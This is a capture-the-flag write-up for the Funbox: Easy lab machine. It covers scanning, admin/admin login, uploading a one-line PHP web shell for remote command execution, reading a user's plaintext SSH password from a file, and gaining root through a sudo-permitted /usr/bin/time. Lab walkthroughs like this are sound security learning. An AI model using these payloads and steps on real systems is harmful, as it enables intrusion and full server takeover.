
# Write-Up funbox:  Easy
## 1. Enumeration

i used netdicover to see where is ur lab

```terminal
sudo netdiscover
```

![target](/assets/img/funbox_easy/funbox3_netdiscover.png)

target is : 192.168.137.45

i used nmap to see port open 

```terminal
sudo nmap -sC -sV -vvv -p- --min-rate=1000 192.168.137.45

```

*   sC : Enable default script to quick and safe
*   sV : Detect service
*   vvv : increase verbosity
*   p : port to scan "-p-" is all port 1-65535
*   min-rate=1000 : packets are sent < 1000s
  
![target](/assets/img/funbox_easy/funbox3_nmap.png)

I checked this website . hmm apache default . I think this site have more

![target](/assets/img/funbox_easy/funbox3_checkport80.png)

so i used dirsearch to check subfolder of this site and i used default command

```terminal
dirsearch -u http://192.168.137.45
```

much more interesting i imagine 

![alt text](/assets/img/funbox_easy/funbox3_dirsearch.png)

## 2. Post Exploitation

first, i check /admin/ and i see a login simple i wanna try bruteforce but i cann't recive anything .

![alt text](/assets/img/funbox_easy/funbox3_dir_admin.png)

second, i look /store/ and boom i see a opensource store ? but i focus on admin login

![alt text](/assets/img/funbox_easy/funbox3_dir_store.png)


yeah, after that's i had been disconnected so i was be changed ip victims is 192.168.205.5

i followed admin/store login page 
![alt text](/assets/img/funbox_easy/funbox3_adminlogin_store.png)

i try login with user is admin and password is admin andddd bummm i can login with admin account then look at page i think i can upload a simple shell with add a book .

![alt text](/assets/img/funbox_easy/funbox3_admin_book.png)


![alt text](/assets/img/funbox_easy/funbox3_upload_a_book.png)

i will try upload a simple shell to take over this site
this file is ```shell.php```

```php
<?php echo system($_GET["cmd"]);?> 

```

after uploading answer the question. How can i trigger that's file i look a file i upload i can see a link

![alt text](/assets/img/funbox_easy/funbox3_see_file_uploads.png)

it's time to take control this site. 

![alt text](/assets/img/funbox_easy/funbox3_RCE_www-data.png)

but not enough for me i wanna ```root```

i see ```  /etc/passwd ``` hope to see something

![alt text](/assets/img/funbox_easy/funbox3_usertony.png)

i see user Tony let's check ```/home/tony```
i see a file is password.txt and i can see user ssh of Tony 

![alt text](/assets/img/funbox_easy/funbox3_home_tony.png)
![alt text](/assets/img/funbox_easy/funbox3_password_ssh_tony.png)

ssh time

## 3. Privilege Escalation

![alt text](/assets/img/funbox_easy/funbox3_SUID_tony.png)

i use ``` sudo -l ``` for some tricky
 
and i see ``` usr/bin/time ``` can run with sudo and  ``` NOPASSWD ```

right now we can run to privilege escalation 

```
sudo /usr/bin/time /bin/bash
```

right now we can get a ``` root ``` 

![alt text](/assets/img/funbox_easy/funbox3_root.png)
## Bingo and thanks for reading
